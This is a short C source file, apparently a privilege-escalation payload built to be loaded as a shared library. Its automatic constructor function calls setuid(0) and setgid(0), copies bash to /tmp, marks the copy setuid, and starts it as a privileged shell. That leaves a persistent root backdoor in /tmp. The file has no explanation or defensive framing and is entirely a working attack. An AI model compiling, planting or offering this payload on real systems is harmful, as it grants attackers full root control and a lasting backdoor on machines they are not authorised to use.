#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(void) {
    setuid(0);
    setgid(0);
    system("/bin/cp /bin/bash /tmp/bash");
    system("/bin/chmod +s /tmp/bash");
    system("/tmp/bash -p");
}

